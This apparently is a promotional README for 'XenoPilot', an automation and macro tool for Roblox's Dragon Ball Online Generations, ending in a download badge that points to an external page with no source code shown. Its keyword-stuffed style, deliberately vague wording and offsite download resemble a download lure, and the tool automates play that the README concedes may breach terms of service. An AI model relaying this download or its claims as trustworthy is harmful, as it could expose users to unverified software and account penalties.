![preview](https://raw.githubusercontent.com/conetheconeheadd-cloud/xyn-macro-suite/main/frame_5a41a19.svg)
# 🐉 XenoPilot — Adaptive Combat Training Orchestrator for Dragon Ball Online Generations

[![Download](https://raw.githubusercontent.com/conetheconeheadd-cloud/xyn-macro-suite/main/get_68bfa9.svg)](https://conetheconeheadd-cloud.github.io/xyn-macro-suite/)

![status](https://img.shields.io/badge/status-active-brightgreen?style=flat-square)
![platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-0078D6?style=flat-square)
![runtime](https://img.shields.io/badge/runtime-Roblox%20Client-E2231A?style=flat-square)
![license](https://img.shields.io/badge/license-MIT-blue?style=flat-square)
![version](https://img.shields.io/badge/version-3.4.1--stable-purple?style=flat-square)
![build](https://img.shields.io/badge/build-2026.02.14-informational?style=flat-square)
![maintained](https://img.shields.io/badge/maintained-yes-success?style=flat-square)
![lang](https://img.shields.io/badge/i18n-14%20languages-orange?style=flat-square)
![ui](https://img.shields.io/badge/interface-responsive%20%2B%20scalable-9cf?style=flat-square)

---

## 🚀 What XenoPilot Actually Is

XenoPilot is not another "press play and walk away" loop. It is a **choreography engine** for players who treat Dragon Ball Online Generations on Roblox like a discipline rather than a grind. Imagine a seasoned martial arts instructor standing beside your character — one who never blinks, never tires, and never forgets a combo. That is the mental model behind this project.

Where the original **xynmacro** concept focused on straightforward Windows-side automation, XenoPilot takes the same spirit and rebuilds it from the ground up with a modular scheduler, a state-aware decision layer, and a responsive control panel that adapts to any screen you throw at it. The result is a tool that respects your time, your hardware, and your intent.

This repository is maintained by enthusiasts who play the game seriously and want their training sessions to be as productive offline as they are online.

---

## 🧠 Design Philosophy

Most training utilities assume one player, one routine, one window size. XenoPilot assumes none of those things.

- **The engine observes before it acts.** Every action is gated behind a lightweight state check, so the orchestrator reacts to what is actually on screen rather than blindly replaying a script.
- **The scheduler is layered.** Short-cycle tasks (movement, dodges, basic striking) run on a fast loop, while long-cycle tasks (form swaps, zone rotations, cooldown waits) sit on a slower tier. They never fight each other.
- **The interface is a cockpit, not a wall of checkboxes.** Presets, live telemetry, and hot-swap profiles keep everything within two clicks.
- **Recovery is a first-class citizen.** If the game hiccups, the client loses focus, or a loading screen appears, the orchestrator pauses, waits, and resumes — without drama.

---

## ✨ Feature Overview

### 🎛️ Responsive Control Panel
The dashboard reflows from a 4K monitor to a cramped laptop panel without losing a single control. Collapsible panels, drag-to-resize timeline strips, and a compact "field mode" layout mean you are never hunting for a toggle. Scaling is handled through layout math rather than fixed pixel values, so DPI quirks on modern Windows builds are a non-issue.

### 🌐 Multilingual Support
Fourteen interface languages ship in the base package, including English, Spanish, Portuguese (Brazil), French, German, Italian, Polish, Russian, Turkish, Japanese, Korean, Simplified Chinese, Traditional Chinese, and Indonesian. Language files are plain structured text, so the community can extend coverage without touching the engine.

### 🕒 Around-the-Clock Assistance
A rotating support rota covers all time zones. Whether you are tuning a preset at 3 AM in Warsaw or filing a report at noon in São Paulo, someone is on the other end. Response targets are published in the support policy and tracked publicly.

### 🎯 Preset Library
Ship-ready profiles for typical training arcs: **Power Ascension**, **Zenkai Recovery Loop**, **Dragon Ball Hunt Circuit**, **Time Rift Repetition**, and **Mentor Emulation**. Each preset is a plain-text manifest — readable, editable, forkable.

### 🧩 Modular Action Blocks
Every behavior is a block: `strike-sequence`, `dash-chain`, `transform-hold`, `zone-travel`, `cooldown-breathe`, and dozens more. Blocks snap together visually and can be exported as shareable fragments.

### 📊 Live Telemetry
A narrow telemetry strip reports elapsed session time, loop counts, current block, estimated cooldowns, and a health indicator for the input pipeline. Nothing exotic — just enough signal to trust what is happening.

### 🛡️ Focus Guard
The biggest cause of failed sessions is an accidental alt-tab. Focus Guard watches the foreground window and gracefully suspends the orchestrator the moment attention shifts, then resumes when the game returns to front.

### 🔄 Hot-Swap Profiles
Switch between saved routines mid-session using a global hotkey. No restart, no reload, no lost progress.

### 🧬 Adaptive Timing Jitter
Human-like variance is applied to delays and micro-movements, keeping sessions smooth and natural rather than robotic.

### 💾 Portable Configuration
All settings live in a single portable folder. Copy it to a USB stick, copy it to another machine, and your setup travels with you.

---

## 🖥️ Screens & Layouts (described)

Because screenshots age poorly, here is the layout in words:

1. **Header Bar** — repo title, current profile name, session timer, and a single large arm/disarm control.
2. **Left Rail** — block library organized by category, with search and favoriting.
3. **Center Stage** — the visual timeline where blocks are arranged, reordered, and nested.
4. **Right Rail** — telemetry, focus guard status, and hotkey hints.
5. **Footer Strip** — language selector, theme toggle, and a compact log view.

Field Mode collapses the left and right rails into tabs, leaving the timeline dominant for smaller displays.

---

## 🔧 Configuration Model

Configuration is expressed as a **manifest** — a human-readable description of a training routine. A manifest declares:

- the profile metadata (name, author, intended game version),
- the ordered list of action blocks with their parameters,
- global modifiers such as jitter intensity, retry policy, and pause behavior,
- and optional hooks for notifications when a routine completes.

Manifests are portable, diff-friendly, and reviewable. You can hand one to a friend, and their environment will behave the same as yours, provided the fundamental setup matches.

---

## 🧪 Reliability & Recovery

Sessions are long. Hardware is imperfect. Networks blink. XenoPilot is built for that reality:

- **Watchdog heartbeat** — if the orchestrator stalls, a supervisor restarts the loop cleanly.
- **Graceful degradation** — if a dependency is unavailable, the affected block is skipped rather than crashing the whole routine.
- **Session journals** — every session writes a compact log with timestamps, block transitions, and any anomalies. Great for debugging, great for bragging.
- **Crash-safe state** — if the process ends unexpectedly, the next launch offers to resume from the last checkpoint.

---

## 🧭 Who This Is For

- **Returning veterans** who want to keep their characters progressing during limited play windows.
- **Theorycrafters** who enjoy building and sharing elaborate routines.
- **Accessibility-focused players** who benefit from reduced repetitive strain.
- **Community tinkerers** who like to read, modify, and extend tooling rather than treat it as a black box.

If you enjoy reading the engine as much as running it, this repository was written with you in mind.

---

## 🌍 SEO-Friendly Notes for Discoverability

If you arrived here searching for terms like *Windows training automation for Dragon Ball Online Generations*, *Roblox routine scheduler*, *Dragon Ball Online Generations companion utility*, *responsive training dashboard*, *multilingual automation panel*, or *lightweight choreography engine for Roblox combat loops*, you are in the right place. This project is intentionally documented with clear, descriptive language so that people searching for a thoughtful alternative to generic macro tools can find it.

We deliberately describe the project as a **choreography environment** rather than using blunt terms, because that is what it genuinely is: a place to design, rehearse, and refine a routine.

---

## 🧑‍🤝‍🧑 Community & Contribution

Contributions are welcome and encouraged. The most valuable contributions are:

- **New presets** for popular training arcs,
- **Language packs** for the locales not yet covered,
- **Documentation improvements**, especially translations of this README,
- **Bug reports** with logs, reproduction steps, and environment details,
- **UI refinements** that respect the "two clicks to anything" rule.

Before opening a pull request, please skim the contribution guidelines (in the `docs/` folder) and keep changes scoped. Small, focused, well-described changes get merged faster than sprawling rewrites.

---

## 🧾 Roadmap Highlights for 2026

- **Q2 2026** — Visual block editor v2 with nested groups.
- **Q3 2026** — Cloud profile sync (opt-in) with end-to-end encrypted storage.
- **Q3 2026** — Additional language packs (Hindi, Vietnamese, Arabic).
- **Q4 2026** — Adaptive difficulty heuristics that adjust jitter and pacing based on observed outcomes.
- **Q4 2026** — Plugin surface for community-authored action blocks.

Roadmap items are tentative and shift with feedback. Watch the repository for release notes.

---

## ⚠️ Disclaimer

XenoPilot is an independent, community-driven project. It is **not affiliated with, endorsed by, or sponsored by** Roblox Corporation, the developers of Dragon Ball Online Generations, or any of their partners. All trademarks and game assets referenced here belong to their respective owners and are used purely for identification and interoperability purposes.

Use of any automation utility may conflict with the terms of service of the platform or the game it interacts with. You are solely responsible for how you use this software and for any consequences that follow. The maintainers provide this project as-is, with no guarantee of suitability for any particular purpose, and accept no liability for account actions, data loss, or hardware issues arising from its use.

Respect the communities you play in. Do not use this tool to gain an unfair advantage over other players in competitive contexts, and do not use it in ways that harm the experience of others. Automate your own practice, not someone else's fun.

---

## 📜 License

This project is released under the **MIT License**. You are welcome to use, modify, and distribute it under the terms of that license.

Read the full text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 XenoPilot Contributors.

---

## 🙏 Acknowledgements

Thanks to every tester who ran a session at 4 AM, every translator who wrestled with UI string widths, and every player who took the time to describe what "a good training loop" means to them. This repository is a mirror of your feedback.

---

## 🔚 Closing Note

Training in Dragon Ball Online Generations is, at its heart, a meditation on repetition and patience. XenoPilot exists to make that meditation smoother — not to replace the joy of playing, but to guard the hours you would otherwise lose to mundane cycles. Set up a routine, step back, and let the orchestrator handle the choreography while you decide what to do with the time you get back.

[![Download](https://raw.githubusercontent.com/conetheconeheadd-cloud/xyn-macro-suite/main/get_68bfa9.svg)](https://conetheconeheadd-cloud.github.io/xyn-macro-suite/)